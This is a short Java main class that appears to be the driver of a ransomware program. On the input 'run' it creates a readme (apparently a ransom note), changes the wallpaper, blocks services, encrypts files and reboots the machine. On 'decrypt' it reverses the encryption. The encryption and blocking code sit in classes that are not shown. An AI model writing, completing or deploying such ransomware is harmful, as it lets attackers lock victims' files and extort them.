package kr.pah;

import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws Exception {
        Scanner sc = new Scanner(System.in);
        String verify = sc.nextLine();
        if (verify.equals("run")) {
            System.out.println("CreateReadme");
            CreateReadme.main();
            System.out.println("Change Wallpaper");
            WallpaperChanger.main();
            System.out.println("Service Block");
            ServiceBlock.blockAll();
            System.out.println("Encrypting...");
            Encrypt.runEncryption();
            System.out.println("Done");
            SystemReboot.main();
        } else if (verify.equals("decrypt")) {
            Decrypt.runDecryption();
        } else {
            System.out.println("NotRun");
        }
    }
}